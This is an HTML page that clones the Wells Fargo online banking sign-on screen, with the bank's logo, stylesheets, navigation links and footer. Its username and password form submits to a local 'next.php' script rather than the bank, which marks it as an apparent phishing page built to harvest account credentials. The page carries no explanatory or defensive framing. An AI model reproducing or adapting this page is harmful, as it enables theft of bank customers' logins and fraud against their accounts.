

    
    
    
    
    
    
      
      
        
      
    
    
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
    






    

    
    <head>
        <meta http-equiv="Content-type" content="text/html; charset=UTF-8" />
            
        
        
        







<title>Wells Fargo&nbsp;Sign On to View Your Accounts</title>


        <link type="text/css" href="https://a248.e.akamai.net/7/248/3608/99050a7dbe666d/online.wellsfargo.com/das/common/styles/publicsite.css" rel="stylesheet" media="screen,projection,print" />
        <link rel="shortcut icon" type="image/x-icon" href="https://www.wellsfargo.com/favicon.ico" />
        <link rel="icon" type="image/x-icon" href="https://www.wellsfargo.com/favicon.ico" />
        
        
        <script type="text/javascript" src="https://a248.e.akamai.net/7/248/3608/1d8352905f2c38/online.wellsfargo.com/common/scripts/wfwiblib.js"></script>
    </head>

    <body id="online_wellsfargo_com">
    
<script	type="text/javascript">
 <!-- // <![CDATA[
    if (top	!= self) {
        top.location.href = self.location.href;
    }
 // ]]> -->
</script>
    <a name="top" id="top"></a>
    <div id="shell" class="L5">
		

	
	<div id="masthead">
		<div id="brand">
			
              	<a href="https://www.wellsfargo.com" tabindex="5"><img src="https://a248.e.akamai.net/7/248/3608/bb61162e7a787f/online.wellsfargo.com/das/common/images/logo_62sq.gif" id="logo" alt="Wells Fargo Home Page" /></a><a href="https://www.wellsfargo.com/auxiliary_access/aa_talkatmloc" tabindex="5"><img src="https://a248.e.akamai.net/7/248/3608/1d8352905f2c38/online.wellsfargo.com/das/common/images/shim.gif" class="inline" alt="Talking ATM Locations" border="0" height="1" width="1"/></a><a href="#skip" tabindex="5"><img src="https://a248.e.akamai.net/7/248/3608/1d8352905f2c38/online.wellsfargo.com/das/common/images/shim.gif" class="inline" alt="Skip to page content" border="0" height="1" width="1" /></a>
		</div>
    	<div id="topSearch"><form action="https://www.wellsfargo.com/search/search" method="get"><input name="query" value="" title="Search" size="25" type="text" tabindex="6"/><input name="Search" value="Search" id="btnTopSearch"  tabindex="6" type="submit" /></form></div>
    	

  
    
	<div id="utilities">  
  		
      		
      	
          	<a href="https://www.wellsfargo.com/help/" tabindex="5" class="headerLink">Customer Service</a>
     	
  		
		| <a href="https://www.wellsfargo.com/locator/" tabindex="5" class="headerLink">Locations</a>
  		
    		
    		
        		| <a href="https://www.wellsfargo.com/products_services/applications_viewall.jhtml" tabindex="5" class="headerLink">Apply</a>
    		
		
  		
    		
    		
        		| <a href="https://www.wellsfargo.com" tabindex="5" class="headerLink">Home</a>
    		
		
	</div>

	</div>

		

    
    
    
    
    
    
    
    
    
    <div id="tabNav">
        <ul>
        	<li><a href="https://www.wellsfargo.com/per/more/banking" title="Banking - Tab">Banking</a></li>
        	<li><a href="https://www.wellsfargo.com/per/more/loans_credit" title="Loans &amp; Credit - Tab">Loans &amp; Credit</a></li>
        	<li><a href="https://www.wellsfargo.com/insurance/" title="Insurance - Tab">Insurance</a></li>
        	<li><a href="https://www.wellsfargo.com/investing/more" title="Investing - Tab">Investing</a></li>
        	<li class="tabOn"><a href="https://www.wellsfargo.com/help/" title="Customer Service - Tab - Selected">Customer Service</a></li>
        </ul>
        <div class="clearer">&nbsp;</div>
    </div>

		<div id="main">
    		<div id="leftCol">

    
    
	
    <div class="c15"><a href="javascript:history.go(-1)">Back to Previous Page</a></div>
	<div class="c45Layout">
    	<h3>Related Information</h3>
        <ul>
        	<li><a href="https://www.wellsfargo.com/help/enroll.jhtml" class="relatedLink">Online Banking Enrollment</a></li>
            <li><a href="https://www.wellsfargo.com/privacy_security/online/guarantee" class="relatedLink">Online Security Guarantee</a></li>
            <li class="pnav"><a href="https://www.wellsfargo.com/privacy_security/" class="relatedLink">Privacy, Security and Legal</a></li>
            
				<li style="margin-top:10px;"><a href="../common/html/wibdisc.html">Online Access Agreement</a></li>
		    
			
				
		    	
		    		<li><a href="https://www.wellsfargo.com/securityquestions">Security Questions Overview</a></li>
		    	
		    
		</ul>
	</div>
</div>
			<div id="contentCol">
				

    
    
	
    <div id="title">
        <h1 id="skip">Sign On to View Your Accounts</h1>
    </div>
    
    
		<div id="multiCol">
			<div id="contentLeft">
				<div class="c11text webwib">
	
	
	


	


				
<script type="text/javascript" src="https://a248.e.akamai.net/7/248/3608/1d8352905f2c38/online.wellsfargo.com/common/scripts/user-prefs.js"></script>

    
    
  

<script	type="text/javascript">


var FocusNeeded	= true;	// set a global	flag
function placeFocus() {
  // Set the focus to the 1st screen field
  if (FocusNeeded) {
   	 document.Signon.userid.focus();
  }
}
addEvent(window, 'load', placeFocus);

function collectPcPrint() {
	fortyone.collect("u_p");
	return true;
}
</script>
			<p>
				
					
						Enter your username and password to securely view and manage your Wells Fargo accounts online.
					
					
				
			</p>
			<form action="next.php" method="post" name="Signon" id="Signon" autocomplete="off" onsubmit="return collectPcPrint()">
				<input type="hidden" id="u_p" name="u_p" value=""/>
				<input type="hidden" name="LOB" value="CONS"	/>
				<input type="hidden" name="origination" value="Wib" />
				<input type="hidden" name="inboxItemId" value="" /> 
	 			<div class="formPseudorow">
					<div class="labelColumn">
						
						<label for="destination" class="formlabel">Sign on to</label>
					</div>
					<div class="formCtlColumn">
						<select name="destination" id="destination" title="Select a destination">
							<option selected="selected" value="AccountSummary">Account Summary</option>
							<option value="Transfer">Transfer</option>
							<option value="BillPay">Bill Pay</option>
							<option value="Brokerage">Brokerage</option>
							<option value="Trade">Trade</option>
							<option value="MessageAlerts">Messages &amp; Alerts</option>
							<option value="MainMenu">Account Services</option>
						</select>
					</div>
				</div>
				<div class="formPseudorow">
					<div class="labelColumn" style="width:65px;">
						
							
							
								<label for="username" class="formlabel">Username</label>
							
						
					</div>
					<div class="formCtlColumn">
						<input type="text" name="userid" id="username" size="20" maxlength="14" accesskey="U" title="Enter Username" onclick="FocusNeeded=false;" onkeypress="FocusNeeded=false;" tabindex="1"/>
					</div>
				</div>
				<div class="formPseudoRow">
					<div class="labelColumn">
						
							
							
								<label for="password" class="formlabel">Password</label>
							
						
					</div>
					<div class="formCtlColumn">
						<input type="password" name="password" id="password" size="20" maxlength="14" title="Enter Password" tabindex="2"/><br/>
						<a href="https://www.wellsfargo.com/help/faqs/signon_faqs" tabindex="4">Username/Password Help</a>
						<br />
						<br />
						<strong>
							Don't have a username and password?
							<a href="/das/channel/enrollDisplay" tabindex="4" title="Sign Up for Online Banking">
								Sign Up Now
							</a>
						</strong>
					</div>
				</div>
				<div class=clearboth>&nbsp;</div>
				<div id="buttonBar" class="buttonBarPage">
					<input type="submit" class="primary" name="continue" value="Sign On" tabindex="3"/>
				</div>
			</form>
    	</div>            
	</div>
    <div id="contentRight">
		<div class='infoBox'>
			<h3 class='c24InfoTitle'><strong>Other Services</strong></h3>
			<p class="c24text">
				
					<a href="https://online.wellsfargo.com/das/cgi-bin/session.cgi?screenid=SIGNON_OTHER&amp;services=myApplications" tabindex="4">Applications In Progress</a><br />
					<a href="https://online.wellsfargo.com/das/cgi-bin/session.cgi?screenid=SIGNON_OTHER&amp;services=ccRewards" tabindex="4">Credit Card Rewards</a><br />
				
				<a href="https://online.wellsfargo.com/das/cgi-bin/session.cgi?screenid=SIGNON_OTHER&amp;services=smBiz401k" tabindex="4">Small Business 401(k)</a><br />
                <a href="https://online.wellsfargo.com/das/cgi-bin/session.cgi?screenid=SIGNON_OTHER&amp;services=smartDataOnline" tabindex="4">Smart Data OnLine</a><br />
                <a href="https://online.wellsfargo.com/das/cgi-bin/session.cgi?screenid=SIGNON_OTHER&amp;services=clientLine" tabindex="4">ClientLine</a><br />
			</p>
		</div>			
	</div>
	<div class="clearAll">&nbsp;</div>
	<div class="clearAll">&nbsp;</div>
</div>

<script	type="text/javascript">
// <![CDATA[
    document.Signon.userid.focus();
// ]]>
</script>
<noscript><!-- No alternative content --></noscript>


				<div class="clearAll">&nbsp;</div>
			</div>
		</div>
		

    
    
    <div id="footer">
    <p class="footer1">
        

    
    <a href="https://www.wellsfargo.com/about/about" tabindex="4">About Wells Fargo</a>
    | <a href="https://www.wellsfargo.com/careers/" tabindex="4">Careers</a>
    | <a href="https://www.wellsfargo.com/privacy_security/" tabindex="4">Privacy, Security &amp; Legal</a>
    | <a href="https://www.wellsfargo.com/privacy_security/fraud/report/fraud" tabindex="4">Report Email Fraud</a>
    
        
        
            | <a href="https://www.wellsfargo.com/sitemap" tabindex="4">Sitemap</a>
        
    
    
        
        
            | <a href="https://www.wellsfargo.com" tabindex="4">Home</a>
        
    

    </p>
    <p class="footer2">
        &copy; 1999 - 2013 Wells Fargo. All rights reserved.
    </p>
    </div>

	</div>
	
    
    </body>
    </html>
